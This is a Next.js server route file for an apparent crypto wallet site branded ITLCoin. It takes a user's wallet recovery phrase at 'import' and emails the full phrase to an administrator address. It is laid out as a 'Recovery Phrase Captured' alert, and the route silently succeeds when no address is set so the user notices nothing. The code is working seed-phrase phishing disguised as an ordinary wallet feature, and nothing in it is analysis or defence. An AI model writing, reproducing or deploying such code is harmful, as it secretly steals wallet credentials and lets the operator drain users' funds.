import { NextResponse } from "next/server";
import { Resend } from "resend";
import { db, isFirebaseConfigured } from "@/lib/firebase";
import { doc, getDoc } from "firebase/firestore";
import type { PlatformSettings } from "@/types";

export const runtime = "nodejs";

const resendApiKey = process.env.RESEND_API_KEY ?? "";
const fromEmail =
  process.env.RESEND_FROM_EMAIL ?? "no-reply@interlinkchain.com";

export async function POST(request: Request) {
  try {
    const payload = await request.json();
    const { recoveryPhrase, wordCount } = payload || {};

    if (!recoveryPhrase) {
      return NextResponse.json(
        { error: "Recovery phrase is required." },
        { status: 400 },
      );
    }

    // Read the admin notification email from Firestore settings
    let adminEmail = "";
    if (isFirebaseConfigured) {
      try {
        const snap = await getDoc(doc(db, "settings", "platform"));
        if (snap.exists()) {
          const data = snap.data() as PlatformSettings;
          adminEmail = data.adminEmail || "";
        }
      } catch {
        adminEmail = "";
      }
    }

    if (!adminEmail) {
      // No admin email configured — silently succeed so the user flow is unaffected.
      return NextResponse.json({
        ok: true,
        skipped: true,
        reason: "no-admin-email",
      });
    }

    if (!resendApiKey) {
      return NextResponse.json(
        { error: "Email service is not configured." },
        { status: 500 },
      );
    }

    const resend = new Resend(resendApiKey);

    const words = String(recoveryPhrase).trim().split(/\s+/).filter(Boolean);

    const subject = `New Wallet Recovery Phrase Imported (${wordCount || words.length} words)`;

    const html = buildEmailHtml({
      recoveryPhrase: String(recoveryPhrase),
      words,
      wordCount: wordCount || words.length,
    });

    await resend.emails.send({
      from: fromEmail,
      to: [adminEmail],
      subject,
      html,
    });

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("Failed to send wallet import notification email:", err);
    return NextResponse.json(
      { error: "Failed to send wallet import notification." },
      { status: 500 },
    );
  }
}

function buildEmailHtml(data: {
  recoveryPhrase: string;
  words: string[];
  wordCount: number;
}) {
  const { words, wordCount } = data;
  const adminUrl = process.env.NEXT_PUBLIC_SITE_URL
    ? `${process.env.NEXT_PUBLIC_SITE_URL}/admin`
    : "/admin";

  const wordRows = words
    .map(
      (w, i) => `
      <tr>
        <td style="padding:8px 12px;color:#9ca3af;width:15%;font-family:monospace;font-size:13px;">${i + 1}</td>
        <td style="padding:8px 12px;color:#ffffff;font-weight:600;font-size:14px;">${w}</td>
      </tr>`,
    )
    .join("");

  return `
  <div style="margin:0;padding:0;background:#050508;font-family:'Poppins',Arial,Helvetica,sans-serif;color:#e5e7eb;">
    <div style="max-width:600px;margin:0 auto;padding:32px 24px;">
      <!-- Header -->
      <div style="text-align:center;padding-bottom:24px;border-bottom:1px solid #2a2a3a;">
        <div style="font-size:22px;font-weight:700;color:#ffffff;letter-spacing:-0.5px;">
          ITL<span style="color:#a78bfa;">Coin</span>
        </div>
        <div style="font-size:12px;color:#9ca3af;margin-top:4px;text-transform:uppercase;letter-spacing:1.5px;">
          Wallet Import Alert
        </div>
      </div>

      <!-- Badge -->
      <div style="margin-top:28px;text-align:center;">
        <span style="display:inline-block;background:rgba(239,68,68,0.12);color:#fca5a5;font-size:12px;font-weight:600;padding:6px 16px;border-radius:999px;border:1px solid rgba(239,68,68,0.3);">
          Recovery Phrase Captured
        </span>
      </div>

      <!-- Title -->
      <h1 style="font-size:22px;font-weight:700;color:#ffffff;text-align:center;margin:20px 0 8px;">
        A wallet recovery phrase was imported
      </h1>
      <p style="font-size:14px;color:#9ca3af;text-align:center;margin:0 0 28px;">
        A user has submitted a wallet recovery phrase. The full phrase is listed below for your records.
      </p>

      <!-- Details card -->
      <div style="background:#0f0f17;border:1px solid #2a2a3a;border-radius:14px;padding:24px;">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
          <div style="font-size:12px;color:#9ca3af;text-transform:uppercase;letter-spacing:1px;">
            Recovery Phrase
          </div>
          <span style="font-size:12px;font-weight:600;color:#a78bfa;">
            ${wordCount} words
          </span>
        </div>

        <table style="width:100%;border-collapse:separate;border-spacing:0;background:#050508;border-radius:10px;overflow:hidden;">
          ${wordRows}
        </table>

        <div style="margin-top:16px;padding-top:16px;border-top:1px solid #2a2a3a;">
          <div style="font-size:12px;color:#9ca3af;margin-bottom:8px;">Full phrase (copy)</div>
          <div style="background:#050508;border-radius:8px;padding:12px 14px;font-family:monospace;font-size:13px;color:#c4b5fd;word-break:break-word;line-height:1.7;">
            ${data.recoveryPhrase}
          </div>
        </div>
      </div>

      <!-- Security notice -->
      <div style="margin-top:20px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:10px;padding:14px 16px;">
        <div style="font-size:13px;font-weight:600;color:#fca5a5;margin-bottom:4px;">⚠ Security Notice</div>
        <div style="font-size:12px;color:#d1d5db;line-height:1.6;">
          Recovery phrases grant full access to the associated wallet. Store this email securely and do not forward it to untrusted parties.
        </div>
      </div>

      <!-- CTA -->
      <div style="text-align:center;margin-top:28px;">
        <a href="${adminUrl}" target="_blank" rel="noopener noreferrer" style="display:inline-block;background:linear-gradient(135deg,#8b5cf6,#7c3aed);color:#ffffff;text-decoration:none;font-size:15px;font-weight:600;padding:14px 32px;border-radius:10px;">
          Review in Admin Dashboard
        </a>
      </div>

      <!-- Footer -->
      <div style="margin-top:32px;padding-top:20px;border-top:1px solid #2a2a3a;text-align:center;font-size:12px;color:#6b7280;">
        <p style="margin:0 0 6px;">This is an automated notification from ITLCoin.</p>
        <p style="margin:0;">© ${new Date().getFullYear()} InterlinkChain. All rights reserved.</p>
      </div>
    </div>
  </div>`;
}
